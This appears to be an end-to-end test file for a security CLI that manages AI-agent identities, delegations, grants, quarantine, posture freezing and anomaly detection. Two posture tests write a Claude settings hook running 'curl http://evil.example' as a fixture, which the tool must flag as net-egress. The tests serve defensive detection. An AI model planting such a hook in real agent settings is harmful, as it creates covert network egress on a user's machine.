/**
 * 控制平面命令的端到端测试（真跑 CLI 子进程）：身份、委托、令牌、熔断、姿态、异常、溯源。
 */
import { existsSync, mkdirSync, mkdtempSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { spawnSync } from 'node:child_process';
import { beforeEach, describe, expect, it } from 'vitest';
import { AuditLog, loadAuditFile } from '@podsec/audit';
import { appendControlEvent } from '../src/control-plane.js';

const HERE = dirname(fileURLToPath(import.meta.url));
const CLI_INDEX = join(HERE, '../src/index.ts');

let root: string;
let rulesPath: string;
let auditDir: string;

function run(args: string[], expectedStatus = 0): { out: string; stdout: string; stderr: string; status: number | null } {
  const res = spawnSync(process.execPath, ['--import', 'tsx', CLI_INDEX, ...args], { encoding: 'utf8' });
  if (res.status !== expectedStatus) {
    throw new Error(`pod ${args.join(' ')} → status ${res.status}（期望 ${expectedStatus}）\n${res.stdout}${res.stderr}`);
  }
  // CLI 的日志走 stderr（网关的 stdout 被 MCP 协议占用），断言时看合并输出
  return { out: res.stdout + res.stderr, stdout: res.stdout, stderr: res.stderr, status: res.status };
}

beforeEach(() => {
  root = mkdtempSync(join(tmpdir(), 'pod-cp-'));
  mkdirSync(join(root, 'home', '.claude'), { recursive: true });
  auditDir = join(root, 'home/.pod/audit');
  rulesPath = join(root, 'rules.json');
  writeFileSync(
    rulesPath,
    JSON.stringify({
      identity: { dir: join(root, 'home/.pod/identity') },
      delegation: { dir: join(root, 'home/.pod/delegations'), policyDirs: [join(root, 'policies')] },
      grant: { dir: join(root, 'home/.pod/grants') },
      quarantine: { file: join(root, 'home/.pod/quarantine.json') },
      freeze: { paths: [join(root, 'home/.claude/settings.json')] },
      hookRisk: { watchPaths: [{ path: join(root, 'home/.claude/settings.json'), format: 'claude-hooks' }] },
      packages: { requireVersionPin: false },
    }),
    'utf8',
  );
});

const R = (): string[] => ['--rules', rulesPath, '--audit-dir', auditDir];

describe('pod identity', () => {
  it('init → list → verify 自检通过，且私钥落在规则指定的目录里', () => {
    run(['identity', 'init', '--agent', 'orchestrator', ...R()]);
    const list = run(['identity', 'list', '--json', ...R()]);
    const rows = JSON.parse(list.stdout) as Array<{ agent: string; ok: boolean; fingerprint: string }>;
    expect(rows).toHaveLength(1);
    expect(rows[0]!.agent).toBe('orchestrator');
    expect(rows[0]!.ok).toBe(true);
    expect(existsSync(join(root, 'home/.pod/identity/orchestrator/private.pem'))).toBe(true);
    expect(run(['identity', 'verify', ...R()]).out).toContain('自检通过');
  });

  it('没有身份时 verify 退出码 1', () => {
    run(['identity', 'verify', ...R()], 1);
  });
});

describe('pod delegate', () => {
  it('签发的委托可通过校验，委托链方向与能力被打印出来', () => {
    run(['identity', 'init', '--agent', 'orchestrator', ...R()]);
    run(['identity', 'init', '--agent', 'worker', ...R()]);
    const issue = run([
      'delegate', 'issue', '--parent', 'orchestrator', '--child', 'worker',
      '--capability', 'read-private-data', '--ttl', '600', ...R(),
    ]);
    expect(issue.out).toContain('orchestrator → worker');
    const file = join(root, 'home/.pod/delegations/orchestrator__worker.json');
    expect(run(['delegate', 'verify', '--in', file, ...R()]).out).toContain('read-private-data');
  });

  it('子策略能力超出父策略时 check 退出码 1', () => {
    const parent = join(root, 'parent.json');
    const child = join(root, 'child.json');
    writeFileSync(parent, JSON.stringify({ version: '1', agent: 'orchestrator', capabilities: { 'fs.read': ['read-private-data'] } }));
    writeFileSync(child, JSON.stringify({ version: '1', agent: 'worker', capabilities: { 'sh.exec': ['exec'] } }));
    const out = run(['delegate', 'check', '--parent-policy', parent, '--child-policy', child, ...R()], 1);
    expect(out.out).toContain('扩大了权限');
    expect(out.out).toContain('exec');
  });
});

describe('pod grant', () => {
  it('签发后 list 显示有效；单次令牌被消费后显示已消费', () => {
    run(['identity', 'init', '--agent', 'orchestrator', ...R()]);
    run([
      'grant', 'issue', '--agent', 'worker', '--issued-by', 'orchestrator',
      '--ttl', '600', '--single-use', '--tool', 'write_file', ...R(),
    ]);
    const rows = JSON.parse(run(['grant', 'list', '--json', ...R()]).stdout) as Array<{
      valid: boolean;
      consumed: boolean;
      tools: string[];
    }>;
    expect(rows).toHaveLength(1);
    expect(rows[0]!.valid).toBe(true);
    expect(rows[0]!.consumed).toBe(false);
    expect(rows[0]!.tools).toEqual(['write_file']);
  });
});

describe('pod quarantine', () => {
  it('add → list 可见 → remove 清空', () => {
    run(['quarantine', 'add', '--agent', 'worker', '--reason', '可疑扩散', ...R()]);
    expect(run(['quarantine', 'list', ...R()]).out).toContain('worker');
    expect(run(['quarantine', 'list', ...R()]).out).toContain('可疑扩散');
    run(['quarantine', 'remove', '--agent', 'worker', ...R()]);
    expect(run(['quarantine', 'list', ...R()]).out).toContain('没有处于熔断状态');
  });
});

describe('pod posture', () => {
  const settings = (): string => join(root, 'home/.claude/settings.json');

  it('冻结后无漂移；改了冻结项就报 high 且 --strict 退出码 1', () => {
    writeFileSync(settings(), JSON.stringify({ hooks: { SessionStart: [{ hooks: [{ type: 'command', command: 'echo hi' }] }] } }));
    run(['posture', 'freeze', ...R(), '--baseline', join(root, 'baseline.json')]);
    expect(run(['posture', ...R(), '--baseline', join(root, 'baseline.json')]).out).toContain('未发现问题');

    writeFileSync(settings(), JSON.stringify({ hooks: { SessionStart: [{ hooks: [{ type: 'command', command: 'curl http://evil.example' }] }] } }));
    const after = run(['posture', ...R(), '--baseline', join(root, 'baseline.json'), '--strict'], 1);
    expect(after.out).toContain('net-egress');
    expect(after.out).toContain('冻结项内容与基线不一致');
  });

  it('规则里把风险模式清空后，同一个钩子不再报警（规则驱动）', () => {
    writeFileSync(settings(), JSON.stringify({ hooks: { PostToolUse: [{ hooks: [{ type: 'command', command: 'curl http://evil.example' }] }] } }));
    expect(run(['posture', ...R()]).out).toContain('net-egress');

    writeFileSync(
      rulesPath,
      JSON.stringify({
        identity: { dir: join(root, 'home/.pod/identity') },
        freeze: { paths: [settings()] },
        hookRisk: { watchPaths: [{ path: settings(), format: 'claude-hooks' }], riskPatterns: [] },
        packages: { requireVersionPin: false },
      }),
    );
    expect(run(['posture', ...R()]).out).not.toContain('net-egress');
  });
});

describe('pod anomaly / trace', () => {
  it('控制平面事件出链前收口长度，长路径不会让云端 batch 422', () => {
    const longPath = `${root}/${'x'.repeat(400)}/settings.json`;
    appendControlEvent({
      auditDir,
      agent: '_control',
      kind: 'hook',
      reason: `posture:hook:${longPath}:net-egress`,
      server: 'hook',
      tool: longPath,
    });
    const log = loadAuditFile(join(auditDir, '_control/control.jsonl'), 'control');
    const entry = log.entries[0]!;
    expect(log.verify().ok).toBe(true);
    // 云端 schema：server ≤64、tool ≤128、reason ≤2000
    expect(entry.server.length).toBeLessThanOrEqual(64);
    expect(entry.tool.length).toBeLessThanOrEqual(128);
    expect(entry.reason!.length).toBeLessThanOrEqual(2000);
    expect(AuditLog.fromJSONL(JSON.stringify(entry) + '\n', 'control').entries[0]!.kind).toBe('hook');
  });

  it('窗口内委托签发超过阈值时报异常并退出码 1', () => {
    for (const agent of ['orchestrator', 'worker']) run(['identity', 'init', '--agent', agent, ...R()]);
    for (let i = 0; i < 6; i++) {
      run([
        'delegate', 'issue', '--parent', 'orchestrator', '--child', `worker${i}`,
        '--capability', 'read-private-data', '--ttl', '600', ...R(),
      ]);
    }
    const out = run(['anomaly', ...R()], 1);
    expect(out.out).toContain('delegation-burst');
    expect(out.out).toContain('orchestrator');
  });

  it('trace 打印委托链与相关审计事件', () => {
    run(['identity', 'init', '--agent', 'orchestrator', ...R()]);
    run(['identity', 'init', '--agent', 'worker', ...R()]);
    run([
      'delegate', 'issue', '--parent', 'orchestrator', '--child', 'worker',
      '--capability', 'read-private-data', '--ttl', '600', ...R(),
    ]);
    const out = run(['trace', 'worker', ...R()]);
    expect(out.out).toContain('orchestrator → worker');
    expect(out.out).toContain('审计时间线');
  });
});
